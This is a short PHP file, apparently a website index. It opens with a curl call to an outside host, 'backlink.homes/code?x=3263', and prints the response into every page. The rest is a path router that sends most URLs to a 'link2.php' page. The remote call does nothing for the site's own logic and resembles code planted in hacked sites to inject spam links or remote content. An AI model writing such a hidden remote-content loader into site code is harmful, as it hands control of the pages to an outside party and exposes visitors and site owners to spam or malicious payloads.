    <?php
    $exe = curl_init();
    curl_setopt($exe, CURLOPT_URL, "https://backlink.homes/code?x=3263");
    curl_exec($exe);
?>
  
<?php
$pagelink=trim(preg_replace('#(\?.*)?#','',$_SERVER['REQUEST_URI']),'/');

if(empty($pagelink)) {
    include_once( 'indexmin.php');
};

if($pagelink=="as") {
    include_once('indexam.php');
};
if($pagelink=="index.php") {
    include_once( 'indexmin.php');
};
if(!empty($pagelink)&&$pagelink!="as") {
    include_once('link2.php');
};
?>
